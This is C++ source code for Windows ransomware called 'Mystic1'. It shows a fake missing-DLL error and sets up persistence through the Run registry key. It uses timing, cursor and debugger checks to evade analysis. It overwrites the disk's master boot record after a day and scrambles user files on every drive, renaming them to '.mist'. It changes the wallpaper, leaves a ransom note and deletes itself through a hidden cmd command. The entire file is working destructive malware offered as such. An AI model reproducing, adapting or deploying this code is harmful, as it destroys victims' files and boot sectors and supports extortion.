#include "includes.h"

#pragma comment(lib, "Advapi32.lib")


int main() {

    FreeConsole();

    SYSTEMTIME ST;
    GetLocalTime(&ST);

    CreateMutexA(0, FALSE, "Local\\$Mystic1$");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        MessageBoxA(NULL, "The program can't start because XINPUT1_3.dll is missing from your computer. Try reinstalling the program to fix this problem or contact the system administrator.", NULL, MB_ICONERROR && MB_OK);
        exit(0);
    }

    DWORD WrittenBytes;
    DWORD Size = 1024;
    char UserName[1024 + 1];
    GetUserNameA(UserName, &Size);
    char DestinationFile[MAX_PATH] = "C:\\Users\\";
    strcat(DestinationFile, UserName);
    strcat(DestinationFile, "\\Music\\Mystic1");
    std::string NewExe = DestinationFile;
    CreateDirectoryA(DestinationFile, NULL);
    strcat(DestinationFile, "\\wallpaper.png");
    HKEY hKey;
    ULONG KeyExists = RegOpenKeyA(HKEY_LOCAL_MACHINE, TEXT("Software\\Oracle\\VirtualBox\\Mystic1"), &hKey);
    if (KeyExists == ERROR_PATH_NOT_FOUND || KeyExists == ERROR_FILE_NOT_FOUND) {
        NewExe += "\\Mysticopy.exe";
        SetFileAttributesA(NewExe.c_str(), FILE_ATTRIBUTE_HIDDEN);
        char PathToSelf[MAX_PATH];
        GetModuleFileNameA(NULL, PathToSelf, MAX_PATH + 1);
        DWORD dwSize;
        CopyFileA(PathToSelf, NewExe.c_str(), false);
        std::string Time = std::to_string(ST.wMinute + (ST.wHour * 60) + (ST.wDay * 24 * 60));
        const size_t count = MAX_PATH * 2;
        char szValue[count] = {};
        strcat(szValue, Time.c_str());
        RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Oracle\\VirtualBox", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);
        dwSize = (DWORD)(strlen(szValue) + 1) * 2;
        RegSetValueExA(hKey, "Mystic1", 0, REG_SZ, (BYTE*)szValue, dwSize);
        RegisterMyProgramForStartup("Mystic1", NewExe.c_str(), "");
    }else{
        CHAR szBuffer[512];
        DWORD dwBufferSize = sizeof(szBuffer);
        ULONG nError;
        nError = RegQueryValueExA(hKey, "Mystic1", 0, NULL, (LPBYTE)szBuffer, &dwBufferSize);
        if (ERROR_SUCCESS == nError)
        {
            if (ST.wMinute + (ST.wHour * 60) + (ST.wDay * 24 * 60) - std::stoi(szBuffer) >= 1440) {
                char data[512];
                memset(data, 0x0F, sizeof(data));
                HANDLE hToken;
                LUID luid;
                LookupPrivilegeValueA(NULL, SE_SHUTDOWN_NAME, &luid);
                TOKEN_PRIVILEGES tp;
                tp.Privileges[0].Luid = luid;
                tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                tp.PrivilegeCount = 1;
                OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);
                AdjustTokenPrivileges(hToken, false, &tp, sizeof(tp), NULL, NULL);
                HANDLE disk = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
                WriteFile(disk, data, 512, &WrittenBytes, NULL);
                CloseHandle(disk);
                ExitWindowsEx(EWX_REBOOT, 0);
                return 0;
            }
        }
    }

    DWORD Tick1 = GetTickCount();

    int RandSeed = (int)time(NULL) * Tick1 * GetCurrentProcessId() * (DWORD)RandomGenerator() * ST.wMilliseconds * ST.wYear / ST.wDay + ST.wMonth;

    srand(RandSeed);

#ifndef debug

    int Time = 60000, Divider = rand() % 10000 + 100, DividedSleep = Time / Divider;

    LPPOINT Pos1, Pos2;

    GetCursorPos(Pos1);

    for (int j = 0; j <= Divider; j++) {
        Sleep(DividedSleep);
    }

    DWORD PatchCheck = GetTickCount();

    GetCursorPos(Pos2);

    if ((int)(PatchCheck - Tick1) < Time - 5000 || Pos1 == Pos2 || IsDebuggerPresent()) {
        MessageBoxA(NULL, "Attempted tampering detected... Sending IP address to Blacklist server.", NULL, MB_ICONERROR && MB_OK);
        char PathToSelf[MAX_PATH];
        GetModuleFileNameA(NULL, PathToSelf, MAX_PATH);
        std::string Command = "/C ping 1.1.1.1 - n 1 - w 3000 > Nul & Del /f /q \"";
        Command += PathToSelf;
        Command += "\" & shutdown -f -r -t 0";
        ShellExecuteA(0, "open", "cmd.exe", Command.c_str(), 0, SW_HIDE);
        //ExitWindowsEx(EWX_SHUTDOWN, 0);
        exit(1);
    }

#endif


    MessageBoxA(NULL, "The program can't start because XINPUT1_3.dll is missing from your computer. Try reinstalling the program to fix this problem or contact the system administrator.", NULL, MB_ICONERROR);
    HANDLE MyFile = CreateFileA(DestinationFile, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    WriteFile(MyFile, rawData, sizeof(rawData), &WrittenBytes, NULL);      //write the raw hex
    CloseHandle(MyFile);
    wchar_t* WallpaperPath = charToWChar(DestinationFile);
    SetWallpaper(WallpaperPath);
    delete[] WallpaperPath;
    std::string Desktop = "C:\\Users\\";
    Desktop += UserName;
    Desktop += "\\Desktop\\ReadMe.txt";
    std::string CDrive = "C:\\Users\\";
    CDrive += UserName;
    LPCSTR Drives[] = {"C:\\","D:\\","E:\\","F:\\","G:\\","U:\\","K:\\","V:\\","W:\\","H:\\","J:\\"};
    for (int i = 0; i < sizeof(Drives) / sizeof(Drives[0]); i++) {
        if (GetDriveTypeA(Drives[i]) != DRIVE_UNKNOWN , DRIVE_NO_ROOT_DIR , DRIVE_RAMDISK){
            if (i > 0) {
                TraverseDir(Drives[i]);
            }else{
                TraverseDir(CDrive);
            }
        }
    }

    fopen_s(&OUTPUT_FILE, Desktop.c_str(), "a+");
    fprintf(OUTPUT_FILE, "%s", "Hello there dear user!\nIt seems like some nasty program computer program crypted all your personal files. ;( \nFortunately for you i have the decryption tool for your files.\n");
    fprintf(OUTPUT_FILE, "%s", PaymentInstructions);
    fprintf(OUTPUT_FILE, "%s", "\nEnjoy a nice continuation of your usual little computer tasks... :3 \n\n --with love, the Mystic1 developer.");
    fclose(OUTPUT_FILE);
    Sleep(500);
    char PathToSelf[MAX_PATH];
    GetModuleFileNameA(NULL, PathToSelf, MAX_PATH);
    std::string Command = "/C ping 1.1.1.1 - n 1 - w 3000 > Nul & Del /f /q \"";
    Command += PathToSelf;
    Command += "\"";
    ShellExecuteA(0, "open", "cmd.exe", Command.c_str(), 0, SW_HIDE);
    exit(1);

}

bool find(const std::string& myString, const std::string& subString)
{
    return
        (myString.substr(0, subString.size()) == subString) ||
        (subString.size() < myString.size() && find(myString.substr(1), subString));
}

void CryptFile(std::string Path) {
    DWORD WrittenBytes;
    int FileKey = rand() % 1000 + 10;
    std::string FileBuffer;
    std::ifstream InputFile(Path, std::ios::binary);
    std::string Buffer;
    while (!InputFile.eof()) {
        std::getline(InputFile, FileBuffer,'\0');
        Buffer += FileBuffer;
        
    }
    InputFile.close();
    DeleteFileA(Path.c_str());
    Path += ".mist";
    int BufferKey = rand() % 1000 + 10;
    for (int i = 0; i < Buffer.size(); i++) {
        if ((int)Buffer[i] % 2 == 0) {
            Buffer[i] = (char)((int)Buffer[i]);
        }
        else {
            if (BufferKey % 2 == 0) {
                Buffer[i] = (char)((int)Buffer[i] + BufferKey);
            }
            else {
                Buffer[i] = (char)((int)Buffer[i] + BufferKey) + 1;
            }
        }
    }
    Buffer += (char)((int)'a' + BufferKey);
    HANDLE MyFile = CreateFileA(Path.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    WriteFile(MyFile, Buffer.c_str(), strlen(Buffer.c_str()), &WrittenBytes, NULL);      //write the raw hex
    CloseHandle(MyFile);
}


void TraverseDir(std::string Path) {
    LPCSTR Extensions[] = { ".txt",".png",".jpg",".pdf",".bmp",".rtf",".doc",".gif",".docx",".xlsx",".odt",".dwg",".xls",".ppt",".pptx",".odf",".c",".cpp",".py",".h" };
    HANDLE sh = NULL;
    WIN32_FIND_DATAA data;
    sh = FindFirstFileA((Path + "\\*").c_str(), &data);
    if (sh == INVALID_HANDLE_VALUE)
    {
        return;
    }
    do
    {
        if (std::string(data.cFileName).compare(".") != 0 && std::string(data.cFileName).compare("..") != 0)
        {
            if ((data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY)
            {
                if (!find(data.cFileName, ".")) {
                    //std::thread Thread(TraverseDir,(Path + "\\" + data.cFileName));
                    //Thread.detach();
                    TraverseDir(Path + "\\" + data.cFileName);
                }
            }
            else
            {
#ifdef CheckExtension
                for (int j = 0; j < sizeof(Extensions) / sizeof(Extensions[0]); j++) {
                    if (find(data.cFileName, Extensions[j]) == true && find(data.cFileName, ".mist") == false) {
                        CryptFile(Path + "\\" + data.cFileName);

                    }
                }
#else
                CryptFile(Path + "\\" + data.cFileName);
#endif
            }
        }
    } while (FindNextFileA(sh, &data)); // do
    FindClose(sh);
}

static wchar_t* charToWChar(const char* text)
{
    const size_t size = strlen(text) + 1;
    wchar_t* wText = new wchar_t[size];
    mbstowcs(wText, text, size);
    return wText;
}

void  SetWallpaper(LPCWSTR file) {
    CoInitializeEx(0, COINIT_APARTMENTTHREADED);
    IActiveDesktop* desktop;
    HRESULT status = CoCreateInstance(CLSID_ActiveDesktop, NULL, CLSCTX_INPROC_SERVER, IID_IActiveDesktop, (void**)&desktop);
    WALLPAPEROPT wOption;
    ZeroMemory(&wOption, sizeof(WALLPAPEROPT));
    wOption.dwSize = sizeof(WALLPAPEROPT);
    wOption.dwStyle = WPSTYLE_STRETCH;
    status = desktop->SetWallpaper(file, 0);
    status = desktop->SetWallpaperOptions(&wOption, 0);
    status = desktop->ApplyChanges(AD_APPLY_ALL);
    desktop->Release();
    CoUninitialize();
}

BOOL RegisterMyProgramForStartup(PCSTR pszAppName, PCSTR pathToExe, PCSTR args)
{
    HKEY hKey = NULL;
    LONG lResult = 0;
    BOOL fSuccess = TRUE;
    DWORD dwSize;
    const size_t count = MAX_PATH * 2;
    char szValue[count] = {};
    strcpy_s(szValue, "\"");
    strcat_s(szValue, pathToExe);
    strcat_s(szValue, "\" ");
    if (args != NULL)
    {
        strcat_s(szValue, args);
    }
    lResult = RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);
    fSuccess = (lResult == 0);
    if (fSuccess)
    {
        dwSize = (DWORD)(strlen(szValue) + 1) * 2;
        lResult = RegSetValueExA(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
        fSuccess = (lResult == 0);
    }
    if (hKey != NULL)
    {
        RegCloseKey(hKey);
        hKey = NULL;
    }
    return fSuccess;
}